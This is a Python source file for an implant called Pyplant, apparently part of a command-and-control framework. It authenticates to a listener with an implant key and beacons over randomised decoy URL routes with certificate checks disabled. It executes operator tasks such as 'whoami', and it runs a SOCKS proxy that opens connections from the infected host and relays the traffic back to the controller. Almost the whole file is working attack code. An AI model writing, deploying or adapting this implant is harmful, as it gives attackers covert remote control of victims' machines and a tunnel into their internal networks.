import base64
import json
import random
import requests
import subprocess
import select
import socket
import threading
import time

from connect.output import display
from connect.convert import bytes_to_base64, base64_to_bytes, string_to_base64

class Pyplant:
    NAME = 'pyplant'
    ROUTES = ['test', 'test1', '1test', '_test', 'test_', 'test?test=test', 'test.png']
    SLEEP = 0.001

    def __init__(self):
        self.downstream_tasks = []
        self.listener_url = None
        self.check_in_task_id = None
        self.batch_request = []
        self.batch_response = []
        self.socks_connections = {}

    def authenticate_implant(self, listener_url: str, implant_key: str):
        route = self.ROUTES[random.randint(0, len(self.ROUTES) - 1)]
        implant_authentication = json.dumps({
            'jsonrpc': '2.0',
            'results': None,
            'id': implant_key
        })
        print(f'{listener_url}/{route}')
        self.check_in_task_id = requests.post(f'{listener_url}/{route}', implant_authentication, verify=False).text

    def retrieve_batch_request(self, listener_url: str):
        self.listener_url = listener_url
        time.sleep(self.SLEEP)
        while True:
            sent_downstream_tasks = self.downstream_tasks
            self.batch_response.extend(sent_downstream_tasks)
            if len(self.batch_request) > 1:
                display('Sending batch response:', 'INFORMATION')
                display(json.dumps(self.batch_response))
            route = self.ROUTES[random.randint(0, len(self.ROUTES) - 1)]
            try:
                results = requests.post(f'{listener_url}/{route}', json.dumps(self.batch_response), verify=False).text
                self.batch_response = []
                for task in sent_downstream_tasks:
                    self.downstream_tasks.remove(task)
                self.batch_response.extend([
                    {
                        'jsonrpc': '2.0',
                        'results': None,
                        'id': self.check_in_task_id
                    }
                ])
            except Exception as e:
                print(e)
                time.sleep(self.SLEEP)
                continue
            try:
                batch_request = json.loads(results)
            except json.decoder.JSONDecodeError:
                time.sleep(self.SLEEP)
                continue
            if len(batch_request) >= 1:
                print(batch_request)
            self.batch_request.extend(batch_request)
            time.sleep(self.SLEEP)

    def run(self, arguments):
        self.authenticate_implant(arguments.url, arguments.key)
        if not self.check_in_task_id:
            display('Implant failed to authenticate', 'ERROR')
            return
        self.batch_response.extend([
            {
                'jsonrpc': '2.0',
                'results': None,
                'id': self.check_in_task_id
            }
        ])
        thread = threading.Thread(target=self.retrieve_batch_request, args=(arguments.url,))
        thread.daemon = True
        thread.start()
        self.process_tasks()

    def socks_downstream(self, client, task_id, params):
        while True:
            r, w, e = select.select([client], [], [], 1)
            if client in r:
                print('reading')
                downstream_data = client.recv(4096)
                if len(downstream_data) == 0:
                    break
                print(downstream_data)
                downstream_results = json.dumps({
                    'downstream_data': bytes_to_base64(downstream_data),
                    'client_id': params[0]
                })
                tasks = [{
                    "jsonrpc": '2.0',
                    "result": string_to_base64(downstream_results),
                    "id": task_id
                }]
                requests.post(f'{self.listener_url}/lol', json.dumps(tasks), verify=False)

    def process_tasks(self):
        while True:
            for task in self.batch_request:
                if not self.verify_task_format(task):
                    continue
                task_id = task.get('id')
                method = task.get('method')
                params = task.get('params')
                results = None
                if method == 'whoami':
                    results = subprocess.run(['whoami'], capture_output=True, text=True).stdout
                if method == 'socks':
                    results = 'socks'
                if method == 'socks_downstream':
                    client = self.socks_connections[params[0]]
                    socks_downstream_thread = threading.Thread(target=self.socks_downstream, args=(client, task_id, params))
                    socks_downstream_thread.daemon = True
                    socks_downstream_thread.start()
                    #results = 'downstream done'
                if method == 'socks_upstream':
                    client = self.socks_connections[params[0]]
                    upstream_data = base64_to_bytes(params[1])
                    try:
                        client.sendall(upstream_data)
                        print('sent')
                    except:
                        continue
                    #results = 'upstream done'
                if method == 'socks_connect':
                    socks_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    rep = None
                    try:
                        socks_connection.connect((params[0], int(params[1])))
                        rep = 0
                    except socket.error as e:
                        if e.errno == socket.errno.EACCES:
                            rep = 2
                        elif e.errno == socket.errno.ENETUNREACH:
                            rep = 3
                        elif e.errno == socket.errno.EHOSTUNREACH:
                            rep = 4
                        elif e.errno == socket.errno.ECONNREFUSED:
                            rep = 5
                        rep = rep if rep else 6

                    if rep != 0:
                        results = json.dumps({
                            'rep': rep,
                            'bind_addr': None,
                            'bind_port': None,
                            'client_id': params[2]
                        })
                    else:
                        self.socks_connections[params[2]] = socks_connection
                        bind_addr = socks_connection.getsockname()[0]
                        bind_port = socks_connection.getsockname()[1]
                        results = json.dumps({
                            'rep': rep,
                            'bind_addr': bind_addr,
                            'bind_port': bind_port,
                            'client_id': params[2]
                        })

                # if not results:
                #     self.batch_response.extend([{
                #         "jsonrpc": "0.0.0",
                #         "error": {
                #             'code': -32601,
                #             'message': f'The {method} method is not supported.'
                #         },
                #         "id": task_id
                #     }])
                #     self.batch_request.remove(task)
                #     continue
                if task_id != self.check_in_task_id:
                    self.batch_response.extend([{
                        "jsonrpc": "0.0.0",
                        "result": self.string_to_base64(results) if results else None,
                        "id": task_id
                    }])
                self.batch_request.remove(task)

    @staticmethod
    def verify_task_format(task: dict) -> bool:
        return True

    @staticmethod
    def base64_to_string(data) -> str:
        """
        Base64 decode a string.
        :param data: A base64 string.
        :return: A base64 decoded string
        :rtype: str
        """
        return base64.b64decode(data.encode('utf-8')).decode('utf-8')

    @staticmethod
    def string_to_base64(data) -> str:
        """
        Base64 encode a string.
        :param data: A python string.
        :return: A base64 encoded string
        :rtype: str
        """
        return str(base64.b64encode(data.encode()), 'utf-8')